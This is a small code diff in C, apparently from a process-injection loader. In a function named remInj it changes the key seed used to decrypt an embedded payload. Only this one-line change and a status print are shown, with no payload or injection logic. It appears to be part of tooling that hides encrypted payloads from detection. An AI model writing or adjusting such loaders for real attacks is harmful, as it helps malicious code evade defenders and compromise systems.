@@ -110,7 +110,7 @@ int remInj() {
         return 0;
     }
 
-    DWORD keySeed = 0x12345678;
+    DWORD keySeed = 0x87654321;
     printf("Decrypting payload with key seed: 0x%x\n", keySeed);
     JITDecrypt(payload, sizeof(payload), keySeed);
 
